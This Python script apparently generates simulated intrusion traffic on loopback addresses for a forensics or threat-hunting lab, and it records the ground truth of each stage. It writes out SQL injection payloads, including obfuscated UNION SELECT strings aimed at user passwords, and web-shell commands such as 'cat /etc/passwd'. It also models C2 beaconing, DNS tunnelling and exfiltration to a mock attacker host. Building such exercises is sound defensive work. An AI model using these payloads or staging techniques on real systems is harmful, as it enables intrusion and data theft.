#!/usr/bin/env python3
"""Phase 1 - multi-stage intrusion traffic generator (single host, loopback aliases).

All hosts are 127.x.x.x aliases on `lo`, so one `tcpdump -i lo` captures every flow with distinct IPs.
Payloads are inert random/synthetic bytes. Nothing leaves the machine. Run as root (ports 53/80/443/873).
  sudo python3 tools/gen_traffic.py            # real-time timeline (~16 min)
  sudo python3 tools/gen_traffic.py --speed 3  # compressed timeline (~5 min)
"""
import argparse, base64, csv, datetime as dt, os, random, socket, ssl, struct, subprocess, sys, threading, time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

CLIENTS = [f"127.10.1.{i}" for i in range(11, 16)]
WEB, APP, DB, BKP, DNS, ATK = "127.10.2.10", "127.10.3.10", "127.10.4.10", "127.10.4.20", "127.10.9.53", "127.66.6.6"
TUNNEL = "telemetry-cdn.example"                       # .example is reserved (RFC 2606): never resolves on the Internet
DOMAINS = ["www.google.com", "www.microsoft.com", "update.ubuntu.com", "cdn.jsdelivr.net", "api.github.com",
           "slack.com", "zoom.us", "fonts.gstatic.com", "login.microsoftonline.com", "mail.corp.example", "shop.corp.example"]
PAGES = ["/", "/index.html", "/login", "/products", "/cart", "/api/products", "/api/cart", "/static/app.js", "/static/site.css", "/contact"]
UAS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
       "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0"]
SPEED, STOP, GT, GT_LOCK = 1.0, threading.Event(), [], threading.Lock()

def sl(sec):                       # time-scaled sleep
    STOP.wait(max(sec, 0) / SPEED)

def jit(base, pct):                # jittered interval
    return random.uniform(base * (1 - pct), base * (1 + pct))

class Stage:                       # records ground truth with wall-clock epochs
    def __init__(self, sid, technique, src, dst, port, note):
        self.row = [sid, technique, src, dst, port, note]
    def __enter__(self): self.t0 = time.time(); return self
    def __exit__(self, *a):
        with GT_LOCK: GT.append([self.row[0], self.row[1], f"{self.t0:.0f}", f"{time.time():.0f}", *self.row[2:]])

# ---------------------------------------------------------------- servers
class Web(BaseHTTPRequestHandler):
    server_version, sys_version = "nginx/1.24.0", ""
    def log_message(self, *a): pass
    def _do(self):
        n = int(self.headers.get("Content-Length") or 0)
        while n > 0: n -= len(self.rfile.read(min(n, 65536)))
        p = self.path.split("?")[0]
        ok = p in PAGES or p.startswith(("/static/", "/uploads/", "/vulnerabilities/")) or p in ("/upload.php", "/api/v2/sync", "/api/v2/upload")
        body = os.urandom(random.randint(300, 3000)) if ok else b"not found"
        self.send_response(200 if ok else 404); self.send_header("Content-Length", str(len(body)))
        self.send_header("Content-Type", "text/html"); self.end_headers(); self.wfile.write(body)
    do_GET = do_POST = do_PUT = _do

class C2(Web):                     # attacker server: mostly tiny replies, occasional 'tasking'
    def _do(self):
        n = int(self.headers.get("Content-Length") or 0)
        while n > 0: n -= len(self.rfile.read(min(n, 65536)))
        body = os.urandom(random.choice([48] * 7 + [2048]))
        self.send_response(200); self.send_header("Content-Length", str(len(body))); self.end_headers(); self.wfile.write(body)
    do_GET = do_POST = do_PUT = _do

def http_server(addr, port, handler=Web, tls=None):
    ThreadingHTTPServer.daemon_threads = True
    srv = ThreadingHTTPServer((addr, port), handler)
    if tls: srv.socket = tls.wrap_socket(srv.socket, server_side=True)
    threading.Thread(target=srv.serve_forever, daemon=True).start()

def tcp_stub(addr, port, banner=b"", reply=(40, 400)):
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.bind((addr, port)); s.listen(256)
    def handle(c):
        try:
            c.settimeout(5)
            if banner: c.sendall(banner)
            while True:
                if not c.recv(65536): break
                c.sendall(os.urandom(random.randint(*reply)))
        except Exception: pass
        finally: c.close()
    def loop():
        while True:
            c, _ = s.accept(); threading.Thread(target=handle, args=(c,), daemon=True).start()
    threading.Thread(target=loop, daemon=True).start()

def dns_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.bind((DNS, 53))
    def loop():
        while True:
            d, a = s.recvfrom(4096)
            try:
                i = 12
                while d[i]: i += d[i] + 1
                q = d[12:i + 5]; ip = "198.51.100.7" if TUNNEL.encode() in d.lower() else f"203.0.113.{random.randint(2, 250)}"
                ans = b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 60, 4) + socket.inet_aton(ip)
                s.sendto(d[:2] + struct.pack("!HHHHH", 0x8180, 1, 1, 0, 0) + q + ans, a)
            except Exception: pass
    threading.Thread(target=loop, daemon=True).start()

# ---------------------------------------------------------------- clients
def conn(src, dst, port, timeout=3):
    return socket.create_connection((dst, port), timeout=timeout, source_address=(src, 0))

def http(src, dst, port, method="GET", path="/", body=b"", ua=None, host="shop.corp.example", ctx=None, sni=None, extra=""):
    try:
        s = conn(src, dst, port)
        if ctx: s = ctx.wrap_socket(s, server_hostname=sni or host)
        req = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua or random.choice(UAS)}\r\nAccept: */*\r\n"
               f"Connection: close\r\n{extra}Content-Length: {len(body)}\r\n\r\n").encode() + body
        s.sendall(req)
        while s.recv(65536): pass
        s.close()
    except Exception: pass

def dns_q(src, name, qtype=1):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.bind((src, 0)); s.settimeout(1)
        q = struct.pack("!HHHHHH", random.randint(0, 65535), 0x0100, 1, 0, 0, 0)
        q += b"".join(bytes([len(l)]) + l.encode() for l in name.split(".")) + b"\0" + struct.pack("!HH", qtype, 1)
        s.sendto(q, (DNS, 53)); s.recvfrom(4096); s.close()
    except Exception: pass

def tcp_session(src, dst, port, rounds=5, size=(60, 300), gap=(0.05, 0.4)):
    try:
        s = conn(src, dst, port); s.settimeout(3)
        try: s.recv(256)
        except Exception: pass
        for _ in range(rounds):
            s.sendall(os.urandom(random.randint(*size))); s.recv(65536); sl(random.uniform(*gap))
        s.close()
    except Exception: pass

CLI_CTX = ssl.create_default_context(); CLI_CTX.check_hostname = False; CLI_CTX.verify_mode = ssl.CERT_NONE

# ---------------------------------------------------------------- background noise
def noise_client(src):
    while not STOP.is_set():
        dns_q(src, random.choice(DOMAINS))
        if random.random() < 0.65: http(src, WEB, 443, path=random.choice(PAGES), ctx=CLI_CTX)
        else: http(src, WEB, 80, path=random.choice(PAGES))
        sl(random.expovariate(1 / 2.5))

def noise_app_db():
    while not STOP.is_set():
        tcp_session(APP, DB, 3306, rounds=random.randint(1, 4), size=(80, 300)); sl(jit(1.5, 0.6))

def noise_web_app():
    while not STOP.is_set():
        http(WEB, APP, 8080, path=random.choice(PAGES), host="app.corp.example"); sl(jit(2, 0.5))

def noise_dns_servers():
    while not STOP.is_set():
        dns_q(random.choice([WEB, APP]), random.choice(["ntp.ubuntu.com", "security.ubuntu.com", "pool.ntp.org"])); sl(jit(20, 0.4))

def legit_backup(at):              # large, legitimate DB -> backup transfer (camouflage for volume-based hunting)
    sl(at)
    if STOP.is_set(): return
    with Stage("N-BKP", "legitimate", DB, BKP, 873, "Scheduled backup (benign, ~8 MB)"):
        try:
            s = conn(DB, BKP, 873); s.settimeout(5); s.recv(64)
            for _ in range(128): s.sendall(os.urandom(65536)); sl(0.05)
            s.close()
        except Exception: pass

# ---------------------------------------------------------------- attack stages
def s1_recon_and_initial_access(at):
    sl(at)
    ua = random.choice(UAS)
    with Stage("S1a", "T1595 / T1046", ATK, WEB, "multi", "Slow port probe (1 probe / ~2.5 s, jittered)"):
        for p in [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 3306, 3389, 5432, 8080, 8443]:
            try: conn(ATK, WEB, p, 0.5).close()
            except Exception: pass
            sl(jit(2.5, 0.5))
    with Stage("S1b", "T1595.003", ATK, WEB, 80, "Content discovery with browser User-Agent (mostly 404)"):
        for w in random.sample(["admin", "backup", ".git/config", "phpmyadmin", "wp-login.php", "config.php", "old", "test", "api/v1", "upload", "console", "server-status"] * 3, 30):
            http(ATK, WEB, 80, path="/" + w, ua=ua); sl(jit(0.8, 0.5))
    with Stage("S1c", "T1190", ATK, WEB, 80, "SQL injection probing, mixed/obfuscated payloads"):
        for pl in ["1'", "1' OR '1'='1", "1' ORDER BY 3-- -", "1' uNiOn SeLeCt NULL,NULL-- -", "1'/**/UNION/**/SELECT/**/user,password/**/FROM/**/users-- -",
                   "1' UN/**/ION SEL/**/ECT user,password FROM users-- -", "1' AND SLEEP(3)-- -", "1' AND (SELECT 1 FROM (SELECT SLEEP(2))a)-- -"]:
            http(ATK, WEB, 80, path="/vulnerabilities/sqli/?id=" + pl.replace(" ", "%20").replace("'", "%27"), ua=ua); sl(jit(2, 0.5))
    with Stage("S1d", "T1505.003", ATK, WEB, 80, "Web shell upload + command execution via GET parameter"):
        shell = b"<?php /* inert lab placeholder */ ?>"
        body = b'--b\r\nContent-Disposition: form-data; name="file"; filename="img.php"\r\nContent-Type: image/jpeg\r\n\r\n' + shell + b"\r\n--b--\r\n"
        http(ATK, WEB, 80, "POST", "/upload.php", body, ua=ua, extra="Content-Type: multipart/form-data; boundary=b\r\n"); sl(3)
        for c in ["id", "whoami", "uname%20-a", "ip%20a", "cat%20/etc/passwd", "ls%20-la%20/var/www"]:
            http(ATK, WEB, 80, path="/uploads/img.php?c=" + c, ua=ua); sl(jit(4, 0.5))

def s2_c2_beacon(at, until):
    sl(at)
    with Stage("S2", "T1071.001 / T1573", WEB, ATK, 8443, "HTTPS beacon, 30 s +/-35% jitter, ~180 B body, new TLS session per beacon"):
        end = time.time() + until / SPEED
        while not STOP.is_set() and time.time() < end:
            http(WEB, ATK, 8443, "POST", "/api/v2/sync", base64.b64encode(os.urandom(random.randint(120, 140))), ctx=CLI_CTX,
                 host="cdn-assets." + TUNNEL, ua="python-requests/2.31.0")
            sl(jit(30, 0.35))

def s3_lateral(at):
    sl(at)
    with Stage("S3a", "T1046", WEB, f"{APP},{DB},{BKP}", "multi", "Internal service discovery from the DMZ web server"):
        for h in (APP, DB, BKP):
            for p in (22, 445, 3306, 5432, 6379, 873, 8080):
                try: conn(WEB, h, p, 0.5).close()
                except Exception: pass
                sl(jit(1.5, 0.4))
    with Stage("S3b", "T1021.004 / T1078", WEB, APP, 22, "SSH session web -> app (flat network permits it)"):
        tcp_session(WEB, APP, 22, rounds=25, size=(48, 220), gap=(0.2, 1.5))
    with Stage("S3c", "T1110 / T1078", WEB, DB, 3306, "Repeated short DB auth attempts web -> db, then long session"):
        for _ in range(7): tcp_session(WEB, DB, 3306, rounds=1, size=(70, 70)); sl(jit(1.2, 0.3))
        tcp_session(WEB, DB, 3306, rounds=60, size=(100, 900), gap=(0.05, 0.5))

def s4_exfil(at):
    sl(at)
    def dns_tunnel():
        with Stage("S4a", "T1048.003 / T1071.004", APP, DNS, 53, "DNS tunnelling: base32 labels under attacker domain, TXT/A mix, ~1.5 s jitter"):
            for i in range(140):
                lab = base64.b32encode(os.urandom(32)).decode().rstrip("=").lower()
                dns_q(APP, f"{lab}.{i:04d}.{TUNNEL}", random.choice([1, 16])); sl(jit(1.5, 0.5))
    def https_chunks():
        with Stage("S4b", "T1041 / T1030", WEB, ATK, 8443, "Chunked HTTPS upload, 8 x ~64 KB every ~40 s"):
            for _ in range(8):
                http(WEB, ATK, 8443, "POST", "/api/v2/upload", base64.b64encode(os.urandom(random.randint(44000, 52000))), ctx=CLI_CTX,
                     host="cdn-assets." + TUNNEL, ua="python-requests/2.31.0"); sl(jit(40, 0.25))
    t = threading.Thread(target=dns_tunnel, daemon=True); t.start(); https_chunks(); t.join()

def s5_impact(at):
    sl(at)
    with Stage("S5", "T1486 / T1490 (network precursor)", WEB, BKP, "873,22", "Mass small/medium writes to backup server, then admin session"):
        for _ in range(160):
            try:
                s = conn(WEB, BKP, 873); s.settimeout(3); s.recv(64); s.sendall(os.urandom(random.randint(5000, 60000))); s.recv(64); s.close()
            except Exception: pass
            sl(random.uniform(0.05, 0.25))
        tcp_session(WEB, BKP, 22, rounds=12, size=(60, 200), gap=(0.2, 0.8))

# ---------------------------------------------------------------- main
def main():
    global SPEED
    here = os.path.dirname(os.path.abspath(__file__)); default_out = os.path.join(os.path.dirname(here), "lab")
    ap = argparse.ArgumentParser(); ap.add_argument("--speed", type=float, default=1.0, help="time compression, 1 = real time")
    ap.add_argument("--out", default=default_out); ap.add_argument("--seed", type=int, default=None); a = ap.parse_args()
    if os.geteuid() != 0: sys.exit("Run as root: sudo python3 tools/gen_traffic.py")
    SPEED = a.speed; random.seed(a.seed); os.makedirs(os.path.join(a.out, "raw"), exist_ok=True)
    key, crt = os.path.join(a.out, "lab.key"), os.path.join(a.out, "lab.crt")
    subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", key, "-out", crt, "-days", "3", "-subj", "/CN=shop.corp.example"],
                   check=True, stderr=subprocess.DEVNULL)
    sctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); sctx.load_cert_chain(crt, key)
    http_server(WEB, 80); http_server(WEB, 443, tls=sctx); http_server(APP, 8080); http_server(ATK, 8443, C2, tls=sctx)
    tcp_stub(DB, 3306); tcp_stub(BKP, 873, b"@RSYNCD: 31.0\n", (4, 16))
    ssh = b"SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13\r\n"; tcp_stub(APP, 22, ssh); tcp_stub(BKP, 22, ssh); dns_server()
    base = 900
    plan = [(noise_client, (c,)) for c in CLIENTS] + [(noise_app_db, ()), (noise_web_app, ()), (noise_dns_servers, ()),
            (legit_backup, (200,)), (legit_backup, (620,)), (s1_recon_and_initial_access, (120,)), (s2_c2_beacon, (300, base - 300)),
            (s3_lateral, (420,)), (s4_exfil, (540,)), (s5_impact, (780,))]
    print(f"[+] servers up | timeline {base / SPEED / 60:.1f} min + cool-down | start tcpdump BEFORE this script, stop it after 'DONE'")
    ths = [threading.Thread(target=f, args=x, daemon=True) for f, x in plan]; t0 = time.time()
    for t in ths: t.start()
    sl(base); STOP.set(); sl(5)
    for t in ths: t.join(timeout=15)
    gt = os.path.join(a.out, "ground_truth.csv")
    with open(gt, "w", newline="") as f:
        w = csv.writer(f); w.writerow(["stage", "attack_technique", "start_epoch", "end_epoch", "src", "dst", "port", "note"]); w.writerows(sorted(GT, key=lambda r: r[2]))
    print(f"[+] DONE {dt.datetime.now():%H:%M:%S} | ground truth -> {gt} (do NOT open it until the investigation is finished)")

if __name__ == "__main__":
    main()
